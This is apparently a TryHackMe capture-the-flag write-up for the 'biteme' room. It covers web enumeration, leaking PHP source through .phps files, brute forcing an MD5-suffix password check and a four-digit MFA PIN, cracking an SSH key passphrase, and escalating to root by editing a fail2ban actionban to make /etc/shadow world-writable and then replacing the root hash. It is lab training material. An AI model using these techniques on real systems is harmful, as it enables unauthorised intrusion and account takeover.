# biteme

![55ca2dd6bf60ecc7c1e960ad974fff90](https://user-images.githubusercontent.com/77704710/158024540-b487cf49-f10e-4f23-8d0a-4457a6147568.png)

A **medium TryHackMe** room with **php**, **privesc**, **cracking**, and **fail2ban** as tags. 


Link: https://tryhackme.com/room/biteme

The creator is [fire015](https://tryhackme.com/p/fire015).

## user.txt

Let's start by launching the **VM** and getting the **IP** address, which in our case was `10.10.21.12`.

First step of enumerating boxes should be **nmap** scanning all of the available ports (`-p-` switch), and getting the info from running services on the box. The `-A` switch enables "aggressive scanning", which gets OS detection, version + script scanning, and traceroute.

```zsh
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ sudo nmap -A -p- -T4 -vvv -oX initialscan.xml 10.10.21.12
```
Based on the output, the box only has 2 ports open:

```zsh
Scanned at 2022-03-12 01:12:38 EET for 43s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 89:ec:67:1a:85:87:c6:f6:64:ad:a7:d1:9e:3a:11:94 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDOkcBZItsAyhmjKqiIiedZbAsFGm/mkiNHjvggYp3zna1Skix9xMhpVbSlVCS7m/AJdWkjKFqK53OfyP6eMEMI4EaJgAT+G0HSsxqH+NlnuAm4dcXsprxT1UluIeZhZ2zG2k9H6Qkz81TgZOuU3+cZ/DDizIgDrWGii1gl7dmKFeuz/KeRXkpiPFuvXj2rlFOCpGDY7TXMt/HpVoh+sPmRTq/lm7roL4468xeVN756TDNhNa9HLzLY7voOKhw0rlZyccx0hGHKNplx4RsvdkeqmoGnRHtaCS7qdeoTRuzRIedgBNpV00dB/4G+6lylt0LDbNzcxB7cvwmqEb2ZYGzn
|   256 7f:6b:3c:f8:21:50:d9:8b:52:04:34:a5:4d:03:3a:26 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBOZGQ8PK6Ag3kAOQljaZdiZTitqMfwmwu6V5pq1KlrQRl4funq9C45sVL+bQ9bOPd8f9acMNp6lqOsu+jJgiec4=
|   256 c4:5b:e5:26:94:06:ee:76:21:75:27:bc:cd:ba:af:cc (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIMpXlaxVKC/3LXrhUOMsOPBzptNVa1u/dfUFCM3ZJMIA
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
| http-methods: 
|_  Supported Methods: HEAD GET POST OPTIONS
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.29 (Ubuntu)
```

`22`, which is **SSH**, and `80` with an **Apache webserver**.

Before starting any bruteforcing attempts to **SSH** or searching for **Apache** exploits, let's take a look at the running webserver by navigating to `http://10.10.21.12` in our web browser (**Firefox**). It's also recommended to leave **Burp** running in the background, so that every request/response is logged into the **HTTP proxy history**.

It's the default **Apache** webpage. 

![image](https://user-images.githubusercontent.com/77704710/158024777-fe9b0367-aad9-4925-b430-5af6630fe264.png)


`It works!`

Often **CTF** boxes hide some sort of information in the **HTML** comments in the default pages, but that was not the case here.

Time to enumerate the server for any interesting directories by fuzzing the webserver root. This can be done with many tools, such as **ffuf**, **wfuzz**, **Burp**, or **gobuster** (used here). Low-hanging fruit can usually be found quickly with the `common.txt` wordlist:

```zsh
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ gobuster -w /usr/share/wordlists/dirb/common.txt dir -u http://10.10.21.12/ 
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.21.12/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/12 01:23:26 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/console              (Status: 301) [Size: 312] [--> http://10.10.21.12/console/]
/index.html           (Status: 200) [Size: 10918]                                
/server-status        (Status: 403) [Size: 276]                                  
                                                                                 
===============================================================
2022/03/12 01:23:52 Finished
===============================================================
```

The `/console` endpoint seems interesting. Upon visiting it, we're met with a login screen containing a Completely Automated Public Turing test to tell Computers and Humans Apart, or [CAPTCHA](https://en.wikipedia.org/wiki/CAPTCHA) for short.

![image](https://user-images.githubusercontent.com/77704710/158024768-fe9ead3e-38c3-454d-88d0-a16610bc3cbe.png)

So it seems like bruteforcing the login is out of the question, since we would need to fill out the **CAPTCHA** for each login attempt. Unless we somehow find a way to bypass it!

Time to fuzz the `/console` endpoint with **gobuster** again for additional directories. 

```zsh
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ gobuster -w /usr/share/wordlists/dirb/common.txt dir -u http://10.10.21.12/console/
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.21.12/console/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2022/03/12 01:30:34 Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 276]
/.htaccess            (Status: 403) [Size: 276]
/.htpasswd            (Status: 403) [Size: 276]
/css                  (Status: 301) [Size: 316] [--> http://10.10.21.12/console/css/]
/index.php            (Status: 200) [Size: 3961]                                     
/robots.txt           (Status: 200) [Size: 25]                                       
/securimage           (Status: 301) [Size: 323] [--> http://10.10.21.12/console/securimage/]
                                                                                            
===============================================================
2022/03/12 01:31:00 Finished
===============================================================
```                                                                  

`/robots.txt` was a dead end. `/securimage`, however, contains a directory listing with many interesting files and directories:

```
Index of /console/securimage
[ICO]	Name	Last modified	Size	Description
[PARENTDIR]	Parent Directory	 	- 	 
[ ]	AHGBold.ttf	2021-11-21 17:29 	141K	 
[TXT]	LICENSE.txt	2021-11-21 17:29 	1.4K	 
[TXT]	README.FONT.txt	2021-11-21 17:29 	398 	 
[TXT]	README.md	2021-11-21 17:29 	8.9K	 
[TXT]	README.txt	2021-11-21 17:29 	8.8K	 
[ ]	WavFile.php	2021-11-21 17:29 	73K	 
[DIR]	audio/	2021-11-21 17:29 	- 	 
[DIR]	backgrounds/	2021-11-21 17:29 	- 	 
[TXT]	captcha.html	2021-11-21 17:29 	7.0K	 
[ ]	composer.json	2021-11-21 17:29 	686 	 
[ ]	config.inc.php.SAMPLE	2021-11-21 17:29 	3.9K	 
[DIR]	database/	2021-11-21 17:29 	- 	 
[ ]	example_form.ajax.php	2021-11-21 17:29 	7.2K	 
[ ]	example_form.php	2021-11-21 17:29 	8.7K	 
[DIR]	examples/	2021-11-21 17:29 	- 	 
[DIR]	images/	2021-11-21 17:29 	- 	 
[TXT]	securimage.css	2021-11-21 17:29 	1.1K	 
[ ]	securimage.js	2021-11-21 17:29 	8.4K	 
[ ]	securimage.php	2021-11-21 17:29 	131K	 
[ ]	securimage_play.php	2021-11-21 17:29 	2.7K	 
[ ]	securimage_play.swf	2021-11-21 17:29 	7.6K	 
[ ]	securimage_show.php	2021-11-21 17:29 	4.0K	 
[DIR]	words/	2021-11-21 17:29 	- 	 
Apache/2.4.29 (Ubuntu) Server at 10.10.21.12 Port 80
```  

For some reason, the **CAPTCHA** plugin directory has been left unprotected and indexable.
Some files, such as `http://10.10.21.12/console/securimage/examples/test.pgsql.php` had verbose error messages revealing further information from the server:

```  
Warning: Database support is turned on in Securimage, but the chosen extension PDO_PGSQL is not loaded in PHP. in /var/www/html/console/securimage/securimage.php on line 2821
Failed to generate captcha image, content has already been output.
This is most likely due to misconfiguration or a PHP error was sent to the browser.
```  

Apart from those, there seemed to be nothing of value. Some test forms with the **CAPTCHAs**, which **sqlmap** found nothing exploitable on, and a sample config file.

Let's go back to the `/console` endpoint, and take a look at the **HTML** source code.

There seems to be a peculiar script:

```js
    <script>
      function handleSubmit() {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
        return true;
      }
    </script>
```  

The code is weirdly obfuscated, but the general gist can be read with the human eye between the pipes (`|`)

Upon further inspection, the full message is output to the browser console when the "Sign in" button is clicked successfully.

> @fred I turned on php file syntax highlighting for you to review... jason

Well, now we have two possible usernames: `fred` and `jason`. But what is this _php file syntax highlighting_? As always, when in doubt, trust the **Big Brother of the internet**, the search engine that knows all the answers. Let's input the unknown thing (_php file syntax highlighting_) into the box, and click "**I'm feeling lucky!**"

![image](https://user-images.githubusercontent.com/77704710/158024929-9ab2d1d7-7dcb-4822-ab21-23d72f9a1b0b.png)

The magic box takes us to the [official site of **php**](https://www.php.net/manual/en/function.highlight-file.php), and tells us to read the manual:


> Prints out or returns a syntax highlighted version of the code contained in filename using the colors defined in the built-in syntax highlighter for PHP.
> Many servers are configured to automatically highlight files with a phps extension. For example, example.phps when viewed will show the syntax highlighted source of the file.

A-ha! Did jason give us a way to view the underlying **php** code of the server? Let's check by requesting the console endpoint with the `.phps` extension:

```php
http://10.10.21.12/console/index.phps

<?php
session_start();

include('functions.php');
include('securimage/securimage.php');

$showError = false;
$showCaptchaError = false;

if (isset($_POST['user']) && isset($_POST['pwd']) && isset($_POST['captcha_code']) && isset($_POST['clicked']) && $_POST['clicked'] === 'yes') {
    $image = new Securimage();

    if (!$image->check($_POST['captcha_code'])) {
        $showCaptchaError = true;
    } else {
        if (is_valid_user($_POST['user']) && is_valid_pwd($_POST['pwd'])) {
            setcookie('user', $_POST['user'], 0, '/');
            setcookie('pwd', $_POST['pwd'], 0, '/');
            header('Location: mfa.php');
            exit();
        } else {
            $showError = true;
        }
    }
}
?>
<!doctype html>
<html lang="en">
  <head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <title>Sign in</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" integrity="sha384-B0vP5xmATw1+K9KRQjQERJvTumQW0nPEzvF6L/Z6nronJ3oUOFUFpCjEUQouq2+l" crossorigin="anonymous">
    <link rel="stylesheet" href="/console/css/style.css">
    <script>
      function handleSubmit() {
        eval(function(p,a,c,k,e,r){e=function(c){return c.toString(a)};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('0.1(\'2\').3=\'4\';5.6(\'@7 8 9 a b c d e f g h i... j\');',20,20,'document|getElementById|clicked|value|yes|console|log|fred|I|turned|on|php|file|syntax|highlighting|for|you|to|review|jason'.split('|'),0,{}))
        return true;
      }
    </script>
  </head>
  <body class="text-center">
    <form action="index.php" method="post" class="form-signin" onsubmit="return handleSubmit()">
        <h1 class="h3 mb-3 font-weight-normal">Please sign in</h1>
        <input type="text" name="user" class="form-control" placeholder="Username" required>
        <input type="password" name="pwd" class="form-control" placeholder="Password" required>
        <?php echo Securimage::getCaptchaHtml(); ?>
        <button class="btn btn-lg btn-primary btn-block" type="submit">Sign in</button>
        <input type="hidden" name="clicked" id="clicked" value="">
        <?php if ($showCaptchaError): ?><p class="mt-3 mb-3 text-danger">Incorrect captcha</p><?php endif ?>
        <?php if ($showError): ?><p class="mt-3 mb-3 text-danger">Incorrect details</p><?php endif ?>
    </form>
  </body>
</html>
``` 


Jackpot! Seems like normal **php** login code. As usual for the language, there are additional included files. `http://10.10.21.12/console/functions.phps`:

```php
 <?php
include('config.php');

function is_valid_user($user) {
    $user = bin2hex($user);

    return $user === LOGIN_USER;
}

// @fred let's talk about ways to make this more secure but still flexible
function is_valid_pwd($pwd) {
    $hash = md5($pwd);

    return substr($hash, -3) === '001';
} 
``` 

Ok... Very weird implementation. Before breaking it down, let's also take a look at the config file in `http://10.10.21.12/console/config.phps`:

```php
 <?php

define('LOGIN_USER', '6a61736f6e5f746573745f6163636f756e74'); 
``` 

It seems like there's no real database implementation for login, instead it's done in a very unique (and not very secure) way.

The username function (`is_valid_user`) takes the supplied **POST** parameter `$user`, and converts it into **hex**, which is then checked against the `LOGIN_USER` string found in `config.php`. By reverting the process, we can find out which username is correct:

```zsh
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ echo '6a61736f6e5f746573745f6163636f756e74' | xxd -r -p
jason_test_account    
``` 

**xxd** is a hexdump utility. `-r` switch is "reverse", `-p` is "plaintext". Using those, we got the username `jason_test_account`.

Now, the password function (`is_valid_pwd`) - again, takes the supplied **POST** parameter `$pwd`, and hashes it with **MD5**. However, Jason has implemented a very unsecure way of handling the password hash as they point out in the comment: The hash is not checked against any database, instead it's only checked that the hash ends in "`001`"! 

Some expert password crackers might have multiple rainbow tables at their disposal, where they could simply grep for '`\.001$`', but unfortunately we don't have that luxury. Thus, let's build a quick **Python** script to go through the classic `rockyou` list, hash it line by line with **MD5**, and if the hash ends in `001`, give us the plaintext password.

```python
import hashlib

def hash_md5(word):
    hash_object = hashlib.md5(f"{word}".encode('utf-8'))	# encode and hash word
    hexhash = hash_object.hexdigest()	# give us the hexdigest of hash
    if hexhash.endswith("001"):
        print(f"Found password: {word}")

with open("/usr/share/wordlists/rockyou.txt" , "r") as file:	# harcoded rockyou path, change as necessary
    for line in file:	# go through wordlist line by line
        for word in line.split():
            hash_md5(word)	# launch function
``` 

When the code above is ran with `python3`, we get a bunch of passwords we can use:

```zsh
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ python3 001.py 
Found password: violet
Found password: gymnastics
Found password: chingy
Found password: sugarplum
Found password: raiden
Found password: 122187
Found password: stokes
Found password: 080884
Found password: 021105
Found password: BLONDIE
Found password: flordeliza
Found password: BABYFACE
<snipped for space>
``` 

"`BABYFACE`" seems like a cool password, let's use that. Going back to `http://10.10.21.12/console/` now that we have the username and password, only thing left to prove is that we're not robots! That can be surprisingly hard.

![image](https://user-images.githubusercontent.com/77704710/158025113-4c65ae5e-1817-419e-a7a9-d11292667eb0.png)

After logging in, we're met with an **MFA** authentication screen. 

![image](https://user-images.githubusercontent.com/77704710/158025117-5daab631-a01c-4f78-8598-a0b954cad65d.png)

How would we get through this? It looks like the credentials we supplied before are saved as cookies (in plaintext no less, come on Jason!), and there's no more **CAPTCHAs** for the **MFA** code.

```http
POST /console/mfa.php HTTP/1.1
Host: 10.10.21.12
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 9
Origin: http://10.10.21.12
Connection: close
Referer: http://10.10.21.12/console/mfa.php
Cookie: PHPSESSID=ng75estd5tfgpn0k8je4sqi77m; user=jason_test_account; pwd=BABYFACE
Upgrade-Insecure-Requests: 1

code=1234
``` 

The **php** file syntax highlighting trick unfortunately didn't work for the `mfa.php` file. Thus we should probably bruteforce this part! The code is only 4 digits. First we need a wordlist containing all possible 4 digit combinations. A quick **bash** script accomplishes this:

```zsh 
# for loop for all 4 digit combinations, direct to txt file

┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ for i in {0000..9999}; do echo "$i"; done > pins.txt

# confirm file line length (should be 10000)     

┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ wc -l pins.txt 
10000 pins.txt
``` 

Now, we can use **wfuzz** to bruteforce all 10000 **PINs**. Since the web application returns an **HTTP** code of `200`, even if the code is incorrect, we need a baseline regarding when the code is wrong:

```zsh 
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ wfuzz -c -z file,pins.txt -u http://10.10.21.12/console/mfa.php -d "code=FUZZ" -H "Cookie: PHPSESSID=ng75estd5tfgpn0k8je4sqi77m; user=jason_test_account; pwd=BABYFACE" 
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.21.12/console/mfa.php
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                      
=====================================================================

000000001:   200        23 L     95 W       1523 Ch     "0000"                                                                                       
000000006:   200        23 L     95 W       1523 Ch     "0005"                                                                                       
000000003:   200        23 L     95 W       1523 Ch     "0002"                                                                                       
000000010:   200        23 L     95 W       1523 Ch     "0009"                                                                                       
000000009:   200        23 L     95 W       1523 Ch     "0008"                                                                                       
000000007:   200        23 L     95 W       1523 Ch     "0006"                                                                                       
000000008:   200        23 L     95 W       1523 Ch     "0007"                                                                                       
000000011:   200        23 L     95 W       1523 Ch     "0010"                                                                                       
<snipped for space>
``` 


We could use multiple switches for filtering out the incorrect payloads, but let's use "**chars**" for this one. Wrong payloads return a response with `1523` characters, so we just add the `--hh` switch:

```zsh 
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ wfuzz -c -z file,pins.txt -u http://10.10.21.12/console/mfa.php -d "code=FUZZ" -H "Cookie: PHPSESSID=ng75estd5tfgpn0k8je4sqi77m; user=jason_test_account; pwd=BABYFACE" --hh 1523
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.21.12/console/mfa.php
Total requests: 10000

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                      
=====================================================================

000002303:   302        0 L      0 W        0 Ch        "2302"    
``` 

"`2302`" is the winner! By inputting that as the MFA, we're directed to the application authenticated as `jason_test_account`.

The application seems to be a basic webshell of sorts: 

"**File browser**" functionality, which lets us list files from the server, and "**File viewer**", which lets us to read them. 

![image](https://user-images.githubusercontent.com/77704710/158025168-0016465a-75e5-45b5-a51d-d5a79f3c3ad2.png)


By using the "**File browser**", we were able to locate `user.txt` in `/home/jason/user.txt`

![image](https://user-images.githubusercontent.com/77704710/158025215-395f47ab-78c9-4864-9ab5-0ff13dd886a0.png)


## root.txt

Alright, now on to get a shell on the box. Since the webshell is a simple list/read, it's probably hard to try any sort of reverse shell here. Luckily, jason has also left their **SSH** private key unprotected in their home directory `/home/jason/.ssh/id_rsa`.

We can read it and save it to our attacking machine. A good tip to remember when saving any sort of detailed information from a webpage is to "**View source**" and save the text from there - otherwise the formatting can go wrong.

![image](https://user-images.githubusercontent.com/77704710/158025234-bb0f216d-cee5-407a-bbc8-ae83ebd5eae4.png)

Save the key and give it the correct permissions so that SSH can use it:

```zsh 
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ nano id_rsa
                                                                                                                                                              
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ chmod 0600 id_rsa
``` 

However, we can't authenticate with the key yet - as seen in the header, it's been encrypted with a passphrase:
``` 
Proc-Type: 4,ENCRYPTED
``` 

**John the Ripper** has a tool called **ssh2john**, which generates a hash from the key file for us to crack.

```zsh 
# Generate a hash file

┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ ssh2john id_rsa > id_rsa.hash                       

# Crack it with rockyou    

┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ john -w=/usr/share/wordlists/rockyou.txt id_rsa.hash
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
<redacted>         (id_rsa)     
1g 0:00:00:00 DONE (2022-03-12 16:44) 50.00g/s 251200p/s 251200c/s 251200C/s christina1..dumnezeu
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
``` 

We can now log in with the key and the passphrase "`<redacted>`".

``` 
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ ssh jason@10.10.21.12 -i id_rsa
The authenticity of host '10.10.21.12 (10.10.21.12)' can't be established.
ED25519 key fingerprint is SHA256:3NvL4FLmtivo46j76+yqa43LcYEB79JAUuXUAYQe/zI.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:129: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.21.12' (ED25519) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Last login: Fri Mar  4 18:22:12 2022 from 10.0.2.2
jason@biteme:~$ 
``` 

Time to escalate! As usual, we start by checking the low-hanging fruit: **cronjobs**, **SUID files**, **capabilities**, **backup files**, and **sudo rights**, which gave us something:

```zsh 
jason@biteme:~$ sudo -l
Matching Defaults entries for jason on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jason may run the following commands on biteme:
    (ALL : ALL) ALL
    (fred) NOPASSWD: ALL
``` 

We can issue any commands as `fred`. Let's change to fred's account and enumerate the same things from their account:

```zsh 
jason@biteme:~$ sudo -u fred /bin/bash
fred@biteme:~$ sudo -l
Matching Defaults entries for fred on biteme:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on biteme:
    (root) NOPASSWD: /bin/systemctl restart fail2ban
``` 

Interesting. fred can use their **sudo** rights to restart the **fail2ban** service. This can probably be exploited somehow.

By doing a bit of external research, we found [a brilliant writeup](https://grumpygeekwrites.wordpress.com/2021/01/29/privilege-escalation-via-fail2ban/) by **Grumpy Geek** of using **fail2ban** rules to escalate **Linux** privileges: 

The gist of the exploit is that if a low-level user has write access to `/etc/fail2ban/action.d/iptables-multiport.conf` file containing **fail2ban** rules, the **fail2ban** daemon running as `root` can execute any commands set in the conf file. Let's check if we have access:

```zsh 
fred@biteme:~$ ls -lpah /etc/fail2ban/action.d/iptables-multiport.conf
-rw-r--r-- 1 fred root 1.4K Nov 13 13:38 /etc/fail2ban/action.d/iptables-multiport.conf
``` 

Not only do we have write access, the file itself is owned by us! Or fred, rather. As per **Grumpy Geek**'s writeup, we can now add any command to the "`actionban`" variable, and have it executed when someone tries to bruteforce **SSH**. The easy route is just to change the holy grail of **Linux** privilege files, `/etc/shadow`, to be readable and writable for everyone. `/etc/shadow` contains the users and password hashes of any **Linux** system, and write access to it means we can set any password for any user, including `root`.

```zsh 
fred@biteme:~$ nano /etc/fail2ban/action.d/iptables-multiport.conf

<snipped for space>
#
#actionban = <iptables> -I f2b-<name> 1 -s <ip> -j <blocktype>
actionban = chmod 777 /etc/shadow

# Option:  actionunban
<snipped for space>
``` 

Let's save the file and restart the **fail2ban** service for the changes to take effect.

```zsh 
fred@biteme:~$ sudo /bin/systemctl restart fail2ban
``` 

Checking `/etc/shadow` permissions before the rule is activated:

```zsh 
fred@biteme:~$ ls -lpah /etc/shadow
-rw-r----- 1 root shadow 954 Nov 13 17:18 /etc/shadow
``` 

The permissions are as they should be. Now, to activate the **fail2ban** rule, we need to bruteforce **SSH** back on our attacking machine:

```zsh 
┌──(lassi㉿kali)-[~/tryhackme/biteme]
└─$ hydra -l fail2exploit -P /usr/share/wordlists/rockyou.txt ssh://10.10.21.12  
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-03-12 17:02:44
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking ssh://10.10.21.12:22/
``` 

The username (`-l`) and wordlist (`-P`) don't really matter here, as we're not trying to successfully bruteforce our way in anyway. Let's let it run for a while and then cancel with `Ctrl+C`.
Back on the victim machine, how are the `/etc/shadow` permissions now?

```zsh 
fred@biteme:~$ ls -lpah /etc/shadow
-rwxrwxrwx 1 root shadow 954 Nov 13 17:18 /etc/shadow
``` 

This means that we have full access to the file. There's multiple things we could do now, but a simple thing to do is to generate a new password for the `root` user:

```zsh 
fred@biteme:~$ openssl passwd -6 -salt xyz pwned
$6$xyz$5I4IoAWqNNcGCYvBCeIz0UZr5NoOPvvHrwR9B1AX7.1fYnHX3clTDW9YRVi3TYivXiJ8Mb8clrGt7.gTxZGXb1
``` 

And add the hash to `/etc/shadow` for the `root` user:

```zsh 
fred@biteme:~$ nano /etc/shadow
root:$6$xyz$5I4IoAWqNNcGCYvBCeIz0UZr5NoOPvvHrwR9B1AX7.1fYnHX3clTDW9YRVi3TYivXiJ8Mb8clrGt7.gTxZGXb1:18885:0:99999:7:::
daemon:*:18885:0:99999:7:::
bin:*:18885:0:99999:7:::
<snipped for space>
``` 

Now we can log in as the `root` user with our new password and read the root flag:

```zsh 
fred@biteme:~$ su -
Password: 
root@biteme:~# whoami
root
root@biteme:~# cat /root/root.txt
<flag removed for writeup>
``` 

A great box with a really interesting foothold. Thanks again to [fire015](https://tryhackme.com/p/fire015)!


